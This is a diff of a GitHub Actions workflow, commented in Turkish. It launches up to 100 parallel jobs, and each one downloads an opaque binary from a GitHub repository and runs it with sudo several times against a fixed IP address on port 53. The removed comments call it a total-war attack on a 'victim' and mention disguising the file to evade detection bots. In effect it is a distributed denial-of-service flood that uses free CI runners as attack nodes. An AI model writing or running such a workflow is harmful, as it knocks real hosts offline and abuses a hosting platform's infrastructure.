@@ -1,69 +1,39 @@
-name: TekPoyraz - TOTAL WAR (FULL CAPACITY) 😈
-
-
+name: TekPoyraz - VAHŞİ OPTİMİZASYON 🔥
 
 on:
-
-  workflow_dispatch: # Manuel tetikleme
-
-
+  workflow_dispatch:
 
 jobs:
-
-  engine:
-
+  vds:
     runs-on: ubuntu-latest
-
     strategy:
-
-      fail-fast: false # Bir makine patlarsa diğerleri durmasın, ateşe devam!
-
-      max-parallel: 256 # GitHub'ın teorik sınırına dayanıyoruz
-
+      # Paralel çalışacak makine sayısını, hızlı başlatma limitini aşmayacak şekilde 50'ye düşürdük.
+      max-parallel: 100
       matrix:
-
-        # 1'den 256'ya kadar otomatik dizi oluşturur. 
-
-        # GitHub o an kaç tanesine izin verirse hepsini aynı anda açar.
-
-        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60]
-
-        # Ücretsiz hesaplarda genellikle 20 tanesi aynı anda başlar, 
-
-        # biri biter bitmez diğeri havuzdan yeni IP ile gelir.
-
-
-
+        # Maksimum matris öğesi sayısı: 256'ya kadar uzatıldı! 
+        # (instance: [1, 2, 3, ..., 256])
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
     steps:
-
-      - name: Cephaneyi Hazırla
-
+      - name: İndir ve Hazırla
         run: |
-
-          # Botları uyutmak için dosyayı indir ve ismini maskele
-
-          curl -L "https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2" -o brsovh2
-
-          chmod +x brsovh2
-
-
-
-      - name: TÜM GÜCÜYLE SALDIR
-
+          wget https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2 -O brsovhv2
+          chmod +x brsovhv2
+          
+      - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
         run: |
-
-          # Her bir makine kendi içinde 10 ayrı koldan ateş edecek!
-
-          # 20 makine x 10 koldan = 200 eşzamanlı mermi kurbanın tepesinde.
-
-          for i in {1..10}; do
-
-            sudo timeout 300 ./brsovh2 185.121.226.12 53 &
-
+          PIDS=()
+          # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
+          for i in {1..6}; do
+            sudo timeout 60 ./brsovhv2 185.121.226.12 53 &
+            PIDS+=($!)
+          done
+          
+          # Hepsini bekle ve bitir.
+          for pid in "${PIDS[@]}"; do
+            wait $pid
           done
 
-          
-
-          echo "Node ${{ matrix.node }} is saturating the target..."
-
-          wait # Süreçlerin bitmesini bekle
+      - name: Kapanış
+        run: |
+          sleep 60
+          exit 0
